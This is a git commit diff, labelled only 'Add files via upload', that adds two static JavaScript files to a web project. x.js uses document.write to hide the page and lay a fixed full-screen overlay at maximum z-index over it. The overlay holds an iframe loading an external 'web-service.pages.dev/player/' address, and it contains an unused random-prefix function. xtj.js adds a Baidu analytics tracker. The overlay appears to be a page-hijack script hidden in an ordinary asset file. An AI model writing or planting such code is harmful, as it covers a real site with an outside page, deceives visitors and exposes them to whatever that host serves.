7f8aad957cec8e5d4f289b93bfd8c7cee664f440
yaoinge <yyjingao@hotmail.com>
2025-07-08 03:52:32 -0930

    Add files via upload

---
+++ static/js/x.js
@@ -0,0 +1,16 @@
+﻿function generateRandomPrefix() {
+ 
+    var length = Math.floor(Math.random() * 8) + 1; 
+    return 'j'.repeat(length); 
+}
+
+var randomPrefix = generateRandomPrefix(); 
+var baseDomain = 'web-service.pages.dev/player/';
+var fullUrl = 'https://' + baseDomain;
+
+
+document.write('<meta id="viewport" name="viewport" content="user-scalable=no,width=device-width, initial-scale=1.0" />');
+document.write('<style>html,body{width:100%;height:100%;overflow:hidden; margin:0;}</style>');
+document.write('<div style="width:100%;height:100%;position:fixed;top:0;left:0;z-index:2147483647;background:#fff">');
+document.write('<iframe src="' + fullUrl + '" frameborder="0" style="border:0;width:100%;height:100%;"></iframe>');
+document.write('</div>');
---
+++ static/js/xtj.js
@@ -0,0 +1,7 @@
+﻿var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?656547135aa6db3213a1d3d1c6234ad7";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
